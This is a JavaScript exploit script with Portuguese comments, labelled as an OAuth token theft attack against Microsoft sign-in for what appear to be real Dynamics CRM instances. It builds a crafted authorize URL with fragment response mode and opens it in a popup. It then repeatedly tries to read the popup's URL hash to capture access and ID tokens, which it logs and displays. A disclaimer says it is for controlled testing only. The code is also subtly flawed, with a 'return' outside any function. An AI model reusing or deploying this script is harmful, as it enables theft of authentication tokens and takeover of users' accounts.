// OAuth Token Theft Exploit - Remote JS
// ATENÇÃO: Apenas para testes de segurança em ambiente controlado

if(window.exploit_execute) {
    console.log('exploit already executed');
} else {
    window.exploit_execute = 1;
    
    // URL OAuth modificada para usar fragment
    const oauthUrl = 'https://login.microsoftonline.com/03f44f58-9a15-4c83-bc6d-f35bcabf2d1b/oauth2/authorize?client_id=00000007-0000-0000-c000-000000000000&response_type=code%20id_token&scope=openid%20profile&state=OpenIdConnect.AuthenticationProperties%3DMAAAAIniUOCJRhHwpwFgRb05XxxLnBrUIAMxEuCWX6cvKTnxfTwnEBFeq15pdUnAIL4CDAEAAAABAAAACS5yZWRpcmVjdKQBaHR0cHM6Ly9vcmdkY2RjNTkwYi5jcm0yLmR5bmFtaWNzLmNvbS9tYWluLmFzcHg_YXBwaWQ9MzQ0ZTQwOTgtODE4ZC1mMDExLWI0Y2ItNjA0NWJkM2M5ZjUzJnBhZ2V0eXBlPWVudGl0eXJlY29yZCZldG49Y29udGFjdCZpZD0wMTU1OTQyNC04MjhkLWYwMTEtYjRjYi02MDQ1YmQzYzlmNTM%26ReplyUrl%3DMAAAAIniUOCJRhHwpwFgRb05XxykxfrOIJWT5gSSSxKqSGpr4QwISm8Yt1C4PcsKKCk3AGh0dHBzOi8vY3BxLS1zYW1jcm1saXZlc2c2MDUuY3JtMi5keW5hbWljcy5jb20v%26RedirectTo%3DMAAAAIniUOCJRhHwpwFgRb05Xxy4U3nBShTRmuA2wkFt5aZsP2lREyPNrSeLmwpojoEJA2h0dHBzOi8vb3JnZGNkYzU5MGIuY3JtMi5keW5hbWljcy5jb20v%26RedirectToForMcas%3Dhttps%253a%252f%252forgdcdc590b.crm2.dynamics.com%252fmain.aspx%253fappid%253d344e4098-818d-f011-b4cb-6045bd3c9f53%2526pagetype%253dentityrecord%2526etn%253dcontact%2526id%253d01559424-828d-f011-b4cb-6045bd3c9f53&response_mode=fragment&nonce=638935422387499625.NDcxNmMyYjItMmQ1YS00MDg1LWFjNGQtYjBjZjdmMDg4Nzk4MDk4OWUxZjQtNzU1MS00YzEwLWI5OTAtNzg0MmE2MmIyNWQ1&redirect_uri=https%3A%2F%2Fcpq--samcrmlivesg605.crm2.dynamics.com%2F&max_age=86400&claims=%7B%22id_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=ID_NET472&x-client-ver=8.14.0.0';
    
    console.log('Iniciando exploit OAuth...');
    
    // Abre janela OAuth com parâmetros específicos
    const win = window.open(oauthUrl, '_blank', 'width=500,height=600,scrollbars=yes,resizable=yes');
    
    // Verifica se a janela foi aberta
    if (!win) {
        alert('Popup bloqueado! Permita popups para este site.');
        console.error('Popup foi bloqueado pelo navegador');
        return;
    }
    
    console.log('Janela OAuth aberta com sucesso');
    
    // Função para capturar o token
    let attempts = 0;
    const maxAttempts = 15;
    
    function checkForToken() {
        attempts++;
        console.log('Tentativa ' + attempts + ' de capturar token...');
        
        // Verifica se a janela ainda existe
        if (win.closed) {
            console.log('Janela OAuth foi fechada pelo usuário');
            return;
        }
        
        try {
            // Tenta acessar o hash da janela
            if (win.location.hash && win.location.hash.length > 1) {
                const hash = win.location.hash.slice(1);
                console.log('Hash capturado:', hash);
                
                // Parse dos parâmetros do token
                const params = new URLSearchParams(hash);
                const accessToken = params.get('access_token');
                const idToken = params.get('id_token');
                
                let tokenInfo = 'Tokens OAuth capturados:\n\n';
                
                if (accessToken) {
                    tokenInfo += 'Access Token: ' + accessToken.substring(0, 50) + '...\n\n';
                    console.log('Access Token capturado:', accessToken);
                }
                
                if (idToken) {
                    tokenInfo += 'ID Token: ' + idToken.substring(0, 50) + '...\n\n';
                    console.log('ID Token capturado:', idToken);
                }
                
                // Exibe os tokens capturados
                alert(tokenInfo);
                
                // Fecha a janela
                win.close();
                return;
            }
        } catch(e) {
            // Erro esperado devido à Same-Origin Policy
            console.log('Cross-origin error (tentativa ' + attempts + '):', e.message);
        }
        
        // Continua tentando se não chegou no máximo
        if (attempts < maxAttempts && !win.closed) {
            setTimeout(checkForToken, 2000);
        } else {
            console.log('Máximo de tentativas atingido ou janela fechada');
            if (!win.closed) {
                try {
                    win.close();
                } catch(e) {
                    console.log('Erro ao fechar janela:', e);
                }
            }
        }
    }
    
    // Inicia as verificações após 3 segundos
    setTimeout(checkForToken, 3000);
}
